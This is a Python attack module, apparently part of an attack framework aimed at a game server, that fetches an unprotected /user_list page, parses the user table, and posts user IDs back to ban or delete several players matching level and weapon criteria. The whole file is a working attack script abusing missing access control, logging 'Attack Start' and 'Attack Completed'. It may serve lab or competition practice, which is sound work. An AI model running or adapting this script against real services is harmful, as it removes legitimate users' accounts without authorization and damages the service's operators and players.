#!/usr/bin/env python
# coding: UTF-8
import requests
import sys
import re
import bs4


class AtkGameCheatUserListBan(object):
    def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
        self.utility = utility
        self.utility.target = host
        self.host = host
        self.port = port
        self.debug = debug
        self.description = "The module can be delete current users if a user list page can access yet."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkGameCheatUserListBan object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__


    def sendattack(self, count, reverse=True):
        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}
        
        #connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        target_url = "http://" + self.target + "/user_list"

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()  

            headers = { "Content-Type": "application/x-www-form-urlencoded" }
            response1 = session.get(target_url, headers=headers, proxies=proxies, timeout=timeoutvalue)

            print("-----userlist check-----")
            print("Status code:   %i" % response1.status_code)
            print("Response body: %s" % response1.text)

            if int(response1.status_code) != 200:
                self.logger("Attack failed…", "!")
                sys.exit(0)

            regex1 = re.compile(r"%s" % re.escape("<tr>"))
            regex2 = re.compile(r"%s" % re.escape("<td>"))

            if regex1.search(response1.text) and regex2.search(response1.text):
                self.logger("Userlist ACCESS SUCCESS!", "+")   
            else:
                self.logger("Attack failed…", "!")
                sys.exit(0)

            soup1 = bs4.BeautifulSoup(response1.text,"lxml")
            seachresult1 = soup1.find_all('tr')

            regex3 = re.compile(r"%s" % re.escape("<td>"))

            user_array = []

            for row1 in seachresult1:

                if regex3.search(str(row1)):
                    soup2 = bs4.BeautifulSoup(str(row1),"lxml")
                    seachresult2 = soup2.find_all('td')

                    tmp_array = []
                    for row2 in seachresult2:

                        tmp_array.append(row2.get_text()) 

                    user_array.append(tmp_array)

            if reverse:
                user_array.reverse()
            
            num = 1

            for row3 in user_array:

                #if int(row3[3]) != 99 and int(row3[4]) != 9999999 and int(row3[5]) != 9999999 and int(row3[6]) != 9999999:
                if int(row3[3]) < 99 and int(row3[7]) > 1: # check level and weapon id

                    paramsPost = {"user_id": row3[0]}
                    response2 = session.post(target_url, data=paramsPost, headers=headers, proxies=proxies, timeout=timeoutvalue)

                    print(f"{row3[2]} is BAN!")

                    num+=1

                if num > count:
                    break

            print(f"BAN {num-1} user")
            
            self.logger("Attack Completed!", "+")   

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            sys.exit(1)


    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)

